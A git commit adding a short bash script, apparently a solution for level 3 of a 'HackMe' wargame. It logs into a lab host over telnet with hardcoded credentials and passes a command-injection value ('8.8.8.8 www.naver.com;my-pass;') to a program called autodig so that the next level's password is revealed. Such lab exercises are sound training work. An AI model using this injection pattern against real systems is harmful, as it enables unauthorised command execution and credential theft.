b3ddaec2549be67c2d4635ede315e93f875a6a3a
Harkjin.dev <harkjin.dev@gmail.com>
2021-06-04 15:10:36 +0900

    Create level3.sh

---
+++ Reverse/HackMe/Level3/level3.sh
@@ -0,0 +1,27 @@
+#!/bin/bash
+
+# Description:
+# This tool is 
+
+export TERM=xterm
+export LANG=en_US.UTF8
+export IP1=192.168.10.240
+export PORT1=23
+export USER1="level3"
+export PASS1="can you fly?"
+export CMD1="/bin/autodig '8.8.8.8 www.naver.com;my-pass;'"
+export LOG1="level3.log"
+
+attack() {
+    sleep 2; echo "$PASS1"
+    sleep 1; echo "hostname"
+    sleep 1; echo "$CMD1"
+    sleep 1; echo "exit"
+}
+
+> $LOG1 && echo "[*] Log file created."
+echo "[*] Level3 attack started. Please wait...."
+attack | telnet -l $USER1 $IP1 $PORT1 >> $LOG1 2>&1
+
+echo "[+] Level4 password cracked."
+grep 'Level4 Password' $LOG1
